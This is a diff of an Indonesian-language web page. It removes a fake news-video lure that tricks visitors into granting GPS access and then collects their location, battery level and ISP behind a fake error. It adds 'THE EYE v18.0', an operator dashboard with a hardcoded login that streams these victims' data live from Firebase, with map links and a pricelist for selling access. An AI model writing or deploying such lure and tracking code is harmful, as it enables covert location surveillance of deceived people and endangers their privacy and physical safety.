@@ -2,94 +2,127 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GNN - BERITA TERKINI</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>THE EYE v18.0 - FIREBASE REALTIME</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        body { font-family: sans-serif; margin: 0; background: #f0f2f5; }
-        .nav { background: #d32f2f; color: white; padding: 15px; font-weight: bold; text-align: center; }
-        .card { max-width: 450px; margin: 20px auto; background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; }
-        .thumb { width: 100%; height: 200px; background: #000; border-radius: 10px; position: relative; display: flex; align-items: center; justify-content: center; overflow: hidden; }
-        .play-btn { background: rgba(211, 47, 47, 0.9); color: white; padding: 12px 20px; border-radius: 50px; font-weight: bold; border: 2px solid white; cursor: pointer; }
-        h2 { font-size: 18px; margin: 15px 0; color: #111; line-height: 1.4; }
-        .btn-check { background: #d32f2f; color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; }
+        :root { --green: #1b5e20; --gold: #ffd700; --red: #d32f2f; }
+        body { background: #f4f4f4; font-family: sans-serif; margin: 0; padding-bottom: 70px; }
+        .header { background: var(--green); color: white; padding: 15px; text-align: center; font-weight: bold; border-bottom: 3px solid var(--gold); position: sticky; top: 0; z-index: 100; }
+        .tab-content { display: none; padding: 15px; }
+        .active-content { display: block; }
+        .card { background: white; padding: 15px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); margin-bottom: 12px; border-left: 5px solid var(--green); }
+        .nav-item { display: flex; flex-direction: column; align-items: center; color: #888; font-size: 11px; cursor: pointer; }
+        .nav-item.active { color: var(--green); font-weight: bold; }
+        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: white; display: flex; justify-content: space-around; padding: 12px 0; box-shadow: 0 -2px 10px rgba(0,0,0,0.1); border-top-left-radius: 20px; border-top-right-radius: 20px; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 10px; box-sizing: border-box; }
+        button { border: none; border-radius: 10px; padding: 12px; font-weight: bold; cursor: pointer; width: 100%; background: var(--green); color: white; }
     </style>
 </head>
-<body>
+<body onload="initApp()">
 
-<div class="nav">🔴 GNN NEWS EXCLUSIVE</div>
-
-<div class="card">
-    <div class="thumb" onclick="gasLacak()">
-        <div class="play-btn">▶ PUTAR VIDEO</div>
+<div id="login-page" style="display: flex; justify-content: center; align-items: center; height: 95vh;">
+    <div class="card" style="width: 280px; text-align: center; border: none;">
+        <h2 style="color:var(--green)">THE EYE v18.0</h2>
+        <input type="text" id="u" placeholder="ID Owner">
+        <input type="password" id="p" placeholder="Password">
+        <button onclick="doLogin()">AUTHENTICATE</button>
     </div>
-    <h2>HOT NEWS: Kejadian Tak Terduga Terekam Kamera di Dekat Lokasi Anda!</h2>
-    <p style="font-size: 13px; color: #666;">Video ini mengandung konten sensitif. Verifikasi lokasi Anda untuk memastikan Anda berada di zona aman untuk menonton.</p>
-    
-    <button class="btn-check" onclick="gasLacak()">VERIFIKASI & TONTON</button>
+</div>
+
+<div id="app-interface" style="display: none;">
+    <div class="header" id="header-title">🛰️ RADAR FIREBASE</div>
+
+    <div id="tab-radar" class="tab-content active-content">
+        <div id="log-list">Sedang menghubungkan ke Firebase Singapore...</div>
+    </div>
+
+    <div id="tab-cuan" class="tab-content">
+        <div class="card">
+            <h3>💰 PRICELIST</h3>
+            <p>Member: 5K | Admin: 8K | Owner: 15K</p>
+            <button onclick="doLogout()" style="background:#444;">LOGOUT</button>
+        </div>
+    </div>
+
+    <div class="bottom-nav">
+        <div class="nav-item active" onclick="switchTab('tab-radar', '🛰️ RADAR FIREBASE', this)"><i>🛰️</i><span>Radar</span></div>
+        <div class="nav-item" onclick="switchTab('tab-cuan', '💰 CUAN', this)"><i>💰</i><span>Cuan</span></div>
+    </div>
 </div>
 
 <script>
-    async function gasLacak() {
-        const btn = document.querySelector('.btn-check');
-        btn.innerText = "SEDANG MEMVERIFIKASI...";
-        
-        let batInfo = "N/A";
-        let ispInfo = "Mencari Provider...";
+    // === TEMPEL CONFIG FIREBASE LU DISINI ===
+    const firebaseConfig = {
+        apiKey: "AIzaSy...",
+        authDomain: "theeyev18.firebaseapp.com",
+        databaseURL: "https://theeyev18-default-rtdb.asia-southeast1.firebasedatabase.app",
+        projectId: "theeyev18",
+        storageBucket: "theeyev18.appspot.com",
+        messagingSenderId: "...",
+        appId: "..."
+    };
+    // ========================================
 
-        // 1. DATA BATERAI
-        try {
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                batInfo = Math.round(b.level * 100) + "% " + (b.charging ? "(⚡)" : "");
-            }
-        } catch(e) {}
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    let logCount = 0;
 
-        // 2. DATA PROVIDER/ISP
-        try {
-            const res = await fetch('https://ipapi.co/json/');
-            const data = await res.json();
-            ispInfo = data.org || "Provider Privat";
-        } catch(e) { ispInfo = "Provider Tersembunyi"; }
-
-        // 3. EKSEKUSI GPS
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    const lat = pos.coords.latitude;
-                    const lon = pos.coords.longitude;
-                    const jam = new Date().toLocaleTimeString();
-                    
-                    // Format Log untuk Dashboard v17.2
-                    const newLog = `
-                        <div style="background:#fffde7; padding:8px; border-radius:8px; border-left:4px solid #d32f2f;">
-                            <b style="color:#d32f2f;">🔥 TARGET MASUK! [${jam}]</b><br>
-                            🔋 <b>Bat:</b> ${batInfo} | 📶 <b>ISP:</b> ${ispInfo}<br>
-                            📍 <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank" style="color:#1976d2; font-weight:bold;">TAMPILKAN TITIK GPS</a>
-                        </div>
-                    `;
-
-                    // Push ke Database Lokal
-                    let logs = JSON.parse(localStorage.getItem("eye_logs")) || [];
-                    logs.unshift(newLog);
-                    localStorage.setItem("eye_logs", JSON.stringify(logs));
-
-                    // Fake Error
-                    setTimeout(() => {
-                        alert("ERROR 403: Server sibuk atau koneksi Anda tidak stabil. Silakan coba lagi nanti saat sinyal lebih kuat.");
-                        btn.innerText = "COBA LAGI";
-                    }, 1500);
-                },
-                (err) => {
-                    alert("AKSES DITOLAK! Anda wajib mengizinkan lokasi untuk memverifikasi keamanan konten ini.");
-                    btn.innerText = "VERIFIKASI ULANG";
-                },
-                { enableHighAccuracy: true, timeout: 8000 }
-            );
-        } else {
-            alert("Browser tidak mendukung pemutar video ini.");
-        }
+    function initApp() {
+        const saved = sessionStorage.getItem("user");
+        if(saved) renderDashboard();
     }
-</script>
 
+    function doLogin() {
+        if(document.getElementById('u').value === 'kalz' && document.getElementById('p').value === '111') {
+            sessionStorage.setItem("user", "kalz");
+            renderDashboard();
+        } else alert("AKSES DITOLAK!");
+    }
+
+    function renderDashboard() {
+        document.getElementById('login-page').style.display='none';
+        document.getElementById('app-interface').style.display='block';
+        startRadar();
+    }
+
+    function switchTab(id, title, el) {
+        document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active-content'));
+        document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+        document.getElementById(id).classList.add('active-content');
+        document.getElementById('header-title').innerText = title;
+        el.classList.add('active');
+    }
+
+    function startRadar() {
+        // MENGAMBIL DATA REALTIME DARI FIREBASE
+        db.ref('korban').on('value', (snapshot) => {
+            const data = snapshot.val();
+            let html = "";
+            let keys = data ? Object.keys(data).reverse() : [];
+            
+            keys.forEach(id => {
+                const k = data[id];
+                html += `
+                    <div class="card" style="border-left-color:var(--red);">
+                        <b style="color:var(--red);">📍 TARGET TERDETEKSI!</b><br>
+                        🕒 ${k.waktu}<br>
+                        🔋 Bat: ${k.baterai} | 📶 ISP: ${k.isp}<br>
+                        🌍 <a href="${k.maps}" target="_blank" style="color:blue; font-weight:bold;">BUKA LOKASI (MAPS)</a>
+                    </div>
+                `;
+            });
+            document.getElementById('log-list').innerHTML = html || "Menunggu Mangsa...";
+            
+            if(keys.length > logCount) {
+                if(logCount !== 0) alert("🔥 JIRZ! KORBAN BARU MASUK!");
+                logCount = keys.length;
+            }
+        });
+    }
+
+    function doLogout() { sessionStorage.clear(); location.reload(); }
+</script>
 </body>
 </html>
